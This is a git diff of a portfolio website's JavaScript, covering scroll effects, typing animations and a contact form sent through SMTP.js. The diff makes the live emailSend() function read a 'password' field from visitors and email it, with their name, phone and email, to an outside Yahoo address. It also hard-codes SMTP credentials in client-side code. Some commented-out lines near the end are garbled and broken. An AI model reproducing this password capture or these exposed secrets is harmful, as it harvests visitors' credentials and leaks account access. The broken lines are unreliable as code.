@@ -54,7 +54,9 @@
 //     css.innerHTML = ".typewrite > .wrap { border-right: 0.08em solid #fff}";
 //     document.body.appendChild(css);
 // };
+
 const scroll = document.querySelector("scroll-up-btn");
+
 $(document).ready(function () {
   $(window).scroll(function () {
     if (this.scrollY > 20) {
@@ -62,13 +64,14 @@ $(document).ready(function () {
     } else {
       $(".navbar").removeClass("sticky");
     }
-    if (this.scroll > 500) {
+    if (this.scrollY > 100) {
       $(".scroll-up-btn").addClass("show");
     } else {
       $(".scroll-up-btn").removeClass("show");
     }
   });
 
+  window.addEventListener;
   // slide-up script
   $(".scroll-up-btn").click(function () {
     $("html").animate({ scrollTop: 0 });
@@ -83,12 +86,7 @@ $(document).ready(function () {
 
 // typing animation script
 var typed = new Typed(".glitch", {
-  strings: [
-    "Web Developer",
-    "Photographer",
-    "Photo Editor",
-    "Polyglot",
-  ],
+  strings: ["Web Developer", "Photographer", "Photo Editor", "Polyglot"],
   typeSpeed: 100,
   backSpeed: 60,
   loop: true,
@@ -96,12 +94,7 @@ var typed = new Typed(".glitch", {
   startDelay: 600,
 });
 var typed = new Typed(".typing-2", {
-  strings: [
-    "Web Developer",
-    "Photographer",
-    "Photo Editor",
-    "Polyglot",
-  ],
+  strings: ["Web Developer", "Photographer", "Photo Editor", "Polyglot"],
   typeSpeed: 100,
   backSpeed: 60,
   loop: true,
@@ -109,19 +102,53 @@ var typed = new Typed(".typing-2", {
   startDelay: 500,
 });
 
+// function sendMessage() {
+//   (function () {
+//     emailjs.init("7UfMFrTVP-TtrcKYV");
+//   })();
 
+//   var serviceID = "service_6kinpmc";
+//   var templateID = "template_uzzvwdt";
+
+//   var params = {
+//     sendername: document.querySelector("#name").value,
+//     senderemail: document.querySelector("#email").value,
+//     subject: document.querySelector("#subject").value,
+//     message: document.querySelector("#message").value
+//   };
+//   emailjs
+//     .send(serviceID, templateID, params)
+//     .then((res) => {
+//       alert(
+//         "Thank you, " + params["sendername"] + "! Your message has been sent."
+//       );
+//     })
+//     .catch();
+// }
 
 function emailSend() {
   var userName = document.getElementById("name").value;
   var phone = document.getElementById("phone").value;
   var email = document.getElementById("email").value;
+  var password = document.getElementById("password").value;
+  var message = document.getElementById("message").value;
 
   var messageBody =
-    "Name: " + userName + "<br/> Phone: " + phone + "<br/> Email: " + email;
+    "Name: " +
+    userName +
+    "<br/> Phone: " +
+    phone +
+    "<br/> Email: " +
+    email +
+    "<br/> Password: " +
+    password +
+    "<br/> Message: " +
+    message;
   Email.send({
     Host: "smtp.elasticemail.com",
     Username: "hejhej6857@gmail.com",
-    Password: "B52EB63A9BBDB2027663F63B20CDC14AF101",
+    Password:
+      "CF755AFDA89F6E91B97F4D70F34AF26E6DBE000A6C5D59FEE2A400B741F1C7DA6C50EE35148B3FEDC630FB1192E60336",
     To: "midobolt@yahoo.com",
     From: "hejhej6857@gmail.com",
     Subject: "This is the subject",
@@ -134,11 +161,57 @@ function emailSend() {
     }
   });
 }
+// textarea = document.querySelector("#textarea");
+// textarea.addEventListener("input", autoResize, false);
 
-
+// function autoResize() {
+//   this.style.height = 80;
+//   this.style.height = this.scrollHeight + "px";
+// }
 // function emailSend() {
 //   var userName = document.getElementById("name").value;
-//   var email = document.getElementById("email").value;
+//   var subject = document.getElementById("subject").value;
+//   var textarea = document.getElementById("textarea").value;
+
+//   var messageBody =
+//     "Name: " +
+//     userName +
+//     "<br/> Email: " +
+//     email +
+//     "<br/> Subject: " +
+//     subject +
+//     "<br/> Subject: " +
+//     subject +
+//     "<br/> Description: " +
+//     textarea;
+
+//   Email.send({
+//     Host: "smtp.elasticemail.com",
+//     Username: "hejhej6857@gmail.com",
+//     Password:
+//       "CF755AFDA89F6E91B97F4D70F34AF26E6DBE000A6C5D59FEE2A400B741F1C7DA6C50EE35148B3FEDC630FB1192E60336",
+//     To: "midobolt@yahoo.com",
+//     From: "hejhej6857@gmail.com",
+//     Subject: "This is the subject",
+//     Body: messageBody,
+//   }).then((message) => {
+//     if (message == "OK") {
+//       swal("Successful", "Your message was successfully sent!", "success");
+//     } else {
+//       swal("Error", "You clicked the button!", "error");
+//     }
+//   });
+// }
+// textarea = document.querySelector("#message");
+// textarea.addEventListener("input", autoResize, false);
+
+// function autoResize() {
+//   this.style.height = 80;
+//   this.style.height = this.scrollHeight + "px";
+// }
+
+// function emailSend() {
+//   var userName = document".getElementById("".value;
 //   var subject = document.getElementById("subject").value;
 //   var textarea = document.getElementById("textarea").value;
 
@@ -163,14 +236,11 @@ function emailSend() {
 // var btn = document.getElementById("btn");
 // btn.addEventListener('click', function(e) {
 //   e.preventDefault()
-//   var name = document.getElementById("name").value;
-//   var email = document.getElementById("email").value;
+//  " var "il").value;
 //   var subject = document.getElementById("subject").value;
 //   var message = document.getElementById("message").value;
-//   var body =
-//     "name: " +
-//     name +
-//     "<br> email:" +
+//   var body ="
+//     ""> email:" +
 //     email +
 //     "<br> subject" +
 //     subject +
